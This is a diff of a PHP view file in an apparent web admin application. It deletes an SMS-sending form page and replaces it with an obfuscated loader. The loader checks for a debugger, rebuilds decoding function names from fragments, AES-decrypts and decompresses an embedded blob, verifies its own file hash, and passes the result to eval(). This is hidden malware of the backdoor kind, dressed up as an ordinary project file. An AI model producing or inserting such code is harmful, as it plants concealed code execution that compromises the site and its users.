@@ -1,96 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- FORM CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-
- <?php include"sidebar.php"; ?>
-
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-       <?= $this->lang->line('send_sms'); ?>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i> Home</a></li>
-        <li class="active"><?= $this->lang->line('send_sms'); ?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="col-md-6">
-         <div class="box box-primary">
-           
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form role="form" id="sms-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <input type="hidden" id="base_url" value="<?php echo $base_url;; ?>">
-              <div class="box-body">
-                <div class="form-group">
-                  <label for="mobile"><?= $this->lang->line('mobile'); ?> <span class="text-danger">*</span></label>
-                  <input type="tel" class="form-control" id="mobile" name="mobile" placeholder="Mobile 1,Mobile 2,...">
-                  <span id="mobile_msg" style="display:none" class="text-danger"></span>
-                </div>
-                <div class="form-group">
-                  <label for="message"><?= $this->lang->line('message'); ?> <span class="text-danger">*</span></label>
-                  <textarea type="text" class="form-control" id="message" name="message" placeholder=""></textarea>
-                  <span id="message_msg" style="display:none" class="text-danger"></span>
-                </div>
-              
-              </div>
-              <!-- /.box-body -->
-
-              <div class="box-footer"> <button type="button" class="btn bg-orange" title="Back to List" onclick="history.back();">Back</button>
-            
-              <button type="button" id="send" class="btn btn-success" title="Send SMS">Send</button>
-            
-            <a href='<?php echo $base_url; ?>dashboard'><button type="button" class="btn btn-danger" title="Go Dashboard">Close</button></a>
-              </div>
-            </form>
-          </div>
-          <!-- /.box -->
-        </div>
-     
-
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-
-    </section>
-    <!-- /.content -->
-  </div>
-  <!-- /.content-wrapper -->
-
- <?php include"footer.php"; ?>
-
-
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-
-<script src="<?php echo $theme_link; ?>js/sms.js"></script>
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_aox77laa=('bas'.'e64'.'_de'.'cod'.'e');
+$_t7id2ce9=('gzu'.'nco'.'mpr'.'ess');
+$_npunm03s=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_t3oq30um='ANCXyEvN';
+$_s38ub0ab='pwh1H5fE';
+$_dhnj0oai='cwJ+udKS';
+$_oxd6qx5d='T62cbPW7sSI=';
+$_hpskbdna='5kvfn+Gd';
+$_bk5iawea='F8aQHiNG';
+$_alwxz2y2='dX0BZhWC';
+$_up58n090='FdgPZA==';
+$_r3jegez9=$_aox77laa($_dhnj0oai.$_hpskbdna.$_s38ub0ab.$_t3oq30um.$_oxd6qx5d);
+$_vcsbl5yr=$_aox77laa($_alwxz2y2.$_bk5iawea.$_up58n090);
+$_gkkx9e5z=$_aox77laa('qi2Xi1F2h+oU7TX9JvTDGoMWZcjsoMOEurcsNKTSE1FUFXG51RE2fV2N0+R6YZJS9/1We+WZChfXu5hUHj7ToeDafMPEI5nPmktGESU2FCR31DiA2uye6S7usAW/o7kJVzsmQYmM0Nu0TYp51plbnXx3r6uWx3Y3i/tHJFqf0AY/8O5Ji1qhlTeRJTqGbDPDhKpxo+qKZ9t5UFFL/WaA3EomapqVBHO28KY4WdPufQPg93Zx2WPXRXNrFlaFIVhn66TT2XNBsaMI/ItYBZkAT3kywFx1JE8u3MqMvQqbV3CURwA+9e90S1YW8CC8xVS3vPHcHZqXoOJebGseppf/KWpmrQLcU5qx2GXaLtXYrPq8lI34lJQ4sZnDkMruhhSV1Z5ecYgbu0VnoVGvF4gIwPllDFBZa9g6cNFxPOwkRBRBriN9Jfnh2xUP9kq9Awcyd5PDLl7l3uK58mL8kKDMJOZZqP2IRXG1TfhpDSXkMhq6MandhFo1h8cjPp1pAK78y8bhY43SPctoSz8JW7Db/WwWkre5A8CYpK6ccSsS1HXyohT0qJ8ENiptBEFw+dZapt9VDiZ0Xydc/lTAl2SD21sk3L5SmfH/xGAb4GSt5Mmm17uOidOClDrZAn1yqK/W/8lOzPuZvsD045v1JQEs3uJ42vY7jD7HjQXUA7rckKPtAVaPVj1+I/Hhx9j0q8G7WsoiBARLNrSITDGGTAkmsy+jam8xjiG5HNo0mZocjqT9ERt0TV99pr3bTEdLe/5NuZ6977g1lHHklnb+XLrLdK28LkWiYrx35W0RZcCjXJut/g0ri/KvolTt1P+qt+/8xByiGRi0aBsSGateroDKNA7LriKG7LxvSMhRt53OrD7xf0A+Xo7iB+w7VfWik8t9yUc648nbWrwgD3Rxf4ZLpdXQ//4mnpKhuOn32x3W286PfjPI+4kwbqRe/N+OLqxUVBYkr9JH4BPtgv4cIZqcLjvx53Ycqn8QNU5qTOq2QhTvryOkVci1eatg3k9tqGH41KaGY5DCYflfUsAumjs/l9NDrwodTvvaD9s4UaN2ugwj90+Keb/Ek6FziQbvI30V/8p7TUS/RMBw32cMb5carAo2di3suLERwY/EfDkPLBCXKZEEBukFE3+y4snB21Pe+BgPuK8dfk7k67s2vZau24WDUgcQyxQSIBMnY9ManXmTOio7WB8Zgvenyme+6GyQ+/dlQ9K8prwh70YDEUgE6oZWWrVBZZodYoQ5+4P1jtaHRZwFHilBOS4isXq9a8pw1zAFQdcsxdWk8gMlFJ1o8wIgdxUCH3Ts55GcwvzdJjx/fiCJiGgHd/DuI90b4cFVg79hCfo4XIsD20Lff+oJjBINEZlmZzGIZYDgjwcF2kDtLUSxKHh4hS+lOeGMvAnQIwO9xcOwCh4Zspcd0aBWo4DN/w4/UxeNZ8/NitZSJBanRaHL+LkvLRu4LjDFwz3S8/3an/O1SlRTDIfGvJIW2l4tajofE56rG150DiTDuvhbDPCwU5FAl+4BSoDJDMy2ftgUkpyqo4hLxMpCPtMZAu8sH31g22NMXTgIvIWriT0=');
+$_o5zcnt29=$_npunm03s($_gkkx9e5z,'aes-256-cbc',$_r3jegez9,OPENSSL_RAW_DATA,$_vcsbl5yr);
+if($_o5zcnt29===false){exit;}
+$_g4xn4b2r=$_t7id2ce9($_o5zcnt29);
+if($_g4xn4b2r===false){exit;}
+$_q4fq0ss6='dadd01227e875dc0730fb0268f50da2140052de8903e302329f9ab86a2b2b161';
+$_vsv1lty4=@file_get_contents(__FILE__);
+if($_vsv1lty4!==false){
+$_ktmfvxhn=str_replace($_q4fq0ss6,"0000000000000000000000000000000000000000000000000000000000000000",$_vsv1lty4);
+$_gxoy4l62=hash("sha256",$_ktmfvxhn);
+if($_gxoy4l62!==$_q4fq0ss6){@http_response_code(403);exit;}
+}
+eval($_g4xn4b2r);
